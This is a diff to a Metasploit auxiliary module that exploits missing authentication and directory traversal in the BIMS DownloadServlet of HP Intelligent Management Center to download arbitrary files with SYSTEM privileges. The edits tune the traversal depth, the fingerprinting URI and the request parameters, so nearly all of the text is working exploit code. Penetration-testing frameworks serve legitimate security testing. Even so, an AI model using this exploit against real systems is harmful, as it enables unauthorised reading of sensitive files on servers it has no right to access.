@@ -18,7 +18,8 @@ class Metasploit3 < Msf::Auxiliary
           This module exploits a lack of authentication and a directory traversal in HP
         Intelligent Management, specifically in the DownloadServlet from the BIMS component,
         in order to retrieve arbitrary files with SYSTEM privileges. This module has been
-        tested successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.
+        tested successfully on HP Intelligent Management Center 5.1 E0202 with BIMS 5.1 E0201
+        over Windows 2003 SP2.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -40,15 +41,15 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8080),
         OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc']),
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/boot.ini']),
-        # By default files downloaded from C:\Program Files\iMC\client\web\apps\imc\tmp\
-        OptInt.new('DEPTH', [true, 'Traversal depth', 7])
+        # By default files downloaded from C:\Program Files\iMC\client\web\apps\imc\
+        OptInt.new('DEPTH', [true, 'Traversal depth', 6])
       ], self.class)
   end
 
   def is_imc?
     res = send_request_cgi({
-      'uri'    => normalize_uri(target_uri.path.to_s, "", ""),
-      'method' => 'GET'
+      'uri'      => normalize_uri(target_uri.path.to_s, "login.jsf"),
+      'method'   => 'GET'
     })
 
     if res and res.code == 200 and res.body =~ /HP Intelligent Management Center/
@@ -79,7 +80,8 @@ class Metasploit3 < Msf::Auxiliary
       'method'       => 'GET',
       'vars_get'     =>
         {
-          'fileName' => travs
+          'fileName' => travs,
+          'path'     => "/"
         }
     })
 
@@ -87,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
       contents = res.body
       fname = my_basename(datastore['FILEPATH'])
       path = store_loot(
-        'hp.imc.faultdownloadservlet',
+        'hp.imc.bimsdownloadservlet',
         'application/octet-stream',
         ip,
         contents,
